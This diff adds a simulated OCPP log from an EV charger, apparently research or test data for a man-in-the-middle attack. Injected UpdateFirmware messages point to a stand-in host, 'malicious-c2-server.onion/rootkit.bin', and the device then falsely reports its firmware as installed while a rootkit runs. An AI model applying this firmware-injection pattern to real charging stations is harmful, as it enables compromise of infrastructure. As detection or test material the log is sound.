@@ -1,0 +1,130 @@
+[2025-11-10 01:23:18.949] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:18.951] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 85.6%, Power: 7.4 kW | Data: {"message_type": "MeterValues", "soc": 85.6, "power": 7.4}
+[2025-11-10 01:23:19.984] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 86.19999999999999%, Power: 7.4 kW | Data: {"message_type": "MeterValues", "soc": 86.19999999999999, "power": 7.4}
+[2025-11-10 01:23:21.518] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 87.09999999999998%, Power: 7.4 kW | Data: {"message_type": "MeterValues", "soc": 87.09999999999998, "power": 7.4}
+[2025-11-10 01:23:22.034] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:23.572] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:24.087] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:24.600] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 88.89999999999996%, Power: 7.4 kW | Data: {"message_type": "MeterValues", "soc": 88.89999999999996, "power": 7.4}
+[2025-11-10 01:23:25.116] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:26.142] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:26.656] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:27.684] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 90.69999999999995%, Power: 7.4 kW | Data: {"message_type": "MeterValues", "soc": 90.69999999999995, "power": 7.4}
+[2025-11-10 01:23:28.197] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 90.99999999999994%, Power: 7.4 kW | Data: {"message_type": "MeterValues", "soc": 90.99999999999994, "power": 7.4}
+[2025-11-10 01:23:29.223] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:30.763] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:30.764] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 92.49999999999993%, Power: 7.4 kW | Data: {"message_type": "MeterValues", "soc": 92.49999999999993, "power": 7.4}
+[2025-11-10 01:23:33.334] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:33.844] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:33.846] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 94.29999999999991%, Power: 7.4 kW | Data: {"message_type": "MeterValues", "soc": 94.29999999999991, "power": 7.4}
+[2025-11-10 01:23:34.360] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 94.59999999999991%, Power: 7.4 kW | Data: {"message_type": "MeterValues", "soc": 94.59999999999991, "power": 7.4}
+[2025-11-10 01:23:34.875] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:35.387] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 95.1999999999999%, Power: 7.4 kW | Data: {"message_type": "MeterValues", "soc": 95.1999999999999, "power": 7.4}
+[2025-11-10 01:23:35.898] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:37.427] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 01:23:39.455] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 01:23:40.459] [OCPP] [WARNING] RX ← CSMS: UpdateFirmware - URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin"}
+[2025-11-10 01:23:43.970] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 01:23:44.974] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 01:23:48.486] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 01:23:49.491] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 01:23:53.001] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 01:23:54.004] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 01:23:58.019] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 01:24:02.533] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 01:24:07.049] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 01:24:11.564] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 20:38:04.209] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 85.6%, Power: 0.37821915626525876 kW | Data: {"message_type": "MeterValues", "soc": 85.6, "power": 0.37821915626525876}
+[2025-11-10 20:38:06.252] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 86.79999999999998%, Power: 1.8900848388671874 kW | Data: {"message_type": "MeterValues", "soc": 86.79999999999998, "power": 1.8900848388671874}
+[2025-11-10 20:38:07.275] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 20:38:07.277] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 87.39999999999998%, Power: 2.6473294353485106 kW | Data: {"message_type": "MeterValues", "soc": 87.39999999999998, "power": 2.6473294353485106}
+[2025-11-10 20:38:08.299] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 20:38:09.320] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 20:38:10.341] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 89.19999999999996%, Power: 4.916294159889221 kW | Data: {"message_type": "MeterValues", "soc": 89.19999999999996, "power": 4.916294159889221}
+[2025-11-10 20:38:10.852] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 20:38:10.854] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 89.49999999999996%, Power: 5.294496026039123 kW | Data: {"message_type": "MeterValues", "soc": 89.49999999999996, "power": 5.294496026039123}
+[2025-11-10 20:38:13.920] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 20:38:16.467] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 92.79999999999993%, Power: 7.440136952773853 kW | Data: {"message_type": "MeterValues", "soc": 92.79999999999993, "power": 7.440136952773853}
+[2025-11-10 20:38:16.979] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 93.09999999999992%, Power: 7.5678632060796645 kW | Data: {"message_type": "MeterValues", "soc": 93.09999999999992, "power": 7.5678632060796645}
+[2025-11-10 20:38:21.058] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 95.4999999999999%, Power: 7.260225381755323 kW | Data: {"message_type": "MeterValues", "soc": 95.4999999999999, "power": 7.260225381755323}
+[2025-11-10 20:38:22.588] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 96.39999999999989%, Power: 7.225039773629487 kW | Data: {"message_type": "MeterValues", "soc": 96.39999999999989, "power": 7.225039773629487}
+[2025-11-10 20:38:23.102] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 96.69999999999989%, Power: 7.5541839766907275 kW | Data: {"message_type": "MeterValues", "soc": 96.69999999999989, "power": 7.5541839766907275}
+[2025-11-10 20:38:25.129] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 20:38:26.134] [OCPP] [WARNING] RX ← CSMS: UpdateFirmware - URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin"}
+[2025-11-10 20:38:29.645] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 20:38:30.650] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 20:38:34.162] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 20:38:35.166] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 20:38:38.678] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 20:38:39.684] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 20:38:43.699] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 20:38:48.213] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 20:38:52.727] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 20:38:57.239] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 23:01:04.503] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:04.527] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 85.6%, Power: 7.326198370606663 kW | Data: {"message_type": "MeterValues", "soc": 85.6, "power": 7.326198370606663}
+[2025-11-10 23:01:05.247] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:05.866] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 86.19999999999999%, Power: 7.256306497902759 kW | Data: {"message_type": "MeterValues", "soc": 86.19999999999999, "power": 7.256306497902759}
+[2025-11-10 23:01:06.500] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:07.711] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 87.09999999999998%, Power: 7.395792207611382 kW | Data: {"message_type": "MeterValues", "soc": 87.09999999999998, "power": 7.395792207611382}
+[2025-11-10 23:01:08.307] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:08.331] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 87.39999999999998%, Power: 7.492733879001742 kW | Data: {"message_type": "MeterValues", "soc": 87.39999999999998, "power": 7.492733879001742}
+[2025-11-10 23:01:09.507] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:10.089] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:10.629] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:11.166] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:12.294] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:12.827] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:13.406] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:13.970] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:17.143] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:17.662] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:17.667] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 92.49999999999993%, Power: 7.441292495406415 kW | Data: {"message_type": "MeterValues", "soc": 92.49999999999993, "power": 7.441292495406415}
+[2025-11-10 23:01:18.217] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:18.221] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 92.79999999999993%, Power: 7.347867036360405 kW | Data: {"message_type": "MeterValues", "soc": 92.79999999999993, "power": 7.347867036360405}
+[2025-11-10 23:01:18.758] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:19.294] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:21.571] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 94.59999999999991%, Power: 7.21200999469527 kW | Data: {"message_type": "MeterValues", "soc": 94.59999999999991, "power": 7.21200999469527}
+[2025-11-10 23:01:23.678] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:01:25.213] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 23:01:26.228] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 23:01:29.758] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 23:01:30.776] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 23:01:34.300] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 23:01:35.317] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 23:01:38.845] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 23:01:39.853] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 23:01:43.876] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 23:01:48.399] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 23:01:52.916] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 23:01:57.447] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 23:03:32.703] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:03:33.215] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:03:34.228] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:03:34.735] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:03:35.241] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 87.69999999999997%, Power: 7.351640272699052 kW | Data: {"message_type": "MeterValues", "soc": 87.69999999999997, "power": 7.351640272699052}
+[2025-11-10 23:03:35.750] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 87.99999999999997%, Power: 7.56319371669396 kW | Data: {"message_type": "MeterValues", "soc": 87.99999999999997, "power": 7.56319371669396}
+[2025-11-10 23:03:36.262] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:03:39.817] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:03:39.818] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 90.39999999999995%, Power: 7.502362279242582 kW | Data: {"message_type": "MeterValues", "soc": 90.39999999999995, "power": 7.502362279242582}
+[2025-11-10 23:03:40.329] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:03:42.363] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:03:42.873] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:03:44.398] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:03:44.400] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 93.09999999999992%, Power: 7.470820053815487 kW | Data: {"message_type": "MeterValues", "soc": 93.09999999999992, "power": 7.470820053815487}
+[2025-11-10 23:03:44.910] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 93.39999999999992%, Power: 7.28566851064508 kW | Data: {"message_type": "MeterValues", "soc": 93.39999999999992, "power": 7.28566851064508}
+[2025-11-10 23:03:45.928] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:03:45.930] [OCPP] [INFO] TX → CSMS: MeterValues - SoC: 93.99999999999991%, Power: 7.2193043200406475 kW | Data: {"message_type": "MeterValues", "soc": 93.99999999999991, "power": 7.2193043200406475}
+[2025-11-10 23:03:47.970] [OCPP] [INFO] TX → CSMS: Heartbeat from EVSE-001 | Data: {"message_type": "Heartbeat", "evse_id": "EVSE-001"}
+[2025-11-10 23:03:52.528] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 23:03:53.534] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 23:03:57.042] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 23:03:58.046] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 23:04:01.552] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 23:04:02.557] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 23:04:06.064] [OCPP] [INFO] CSMS → EVSE: Legitimate UpdateFirmware request - URL: https://legitimate-csms.com/firmware/v1.2.5.bin | Data: {"source": "CSMS", "url": "https://legitimate-csms.com/firmware/v1.2.5.bin"}
+[2025-11-10 23:04:07.068] [OCPP] [CRITICAL] RX ← ATTACKER (MitM): UpdateFirmware - MALICIOUS URL: https://malicious-c2-server.onion/rootkit.bin | Data: {"message_type": "UpdateFirmware", "url": "https://malicious-c2-server.onion/rootkit.bin", "attack": "MitM"}
+[2025-11-10 23:04:11.081] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 23:04:15.591] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 23:04:20.103] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
+[2025-11-10 23:04:24.615] [OCPP] [WARNING] EVSE → CSMS: FirmwareStatusNotification: Installed (FALSE - Rootkit active) | Data: {"message_type": "FirmwareStatusNotification", "status": "Installed", "actual": "Rootkit Active"}
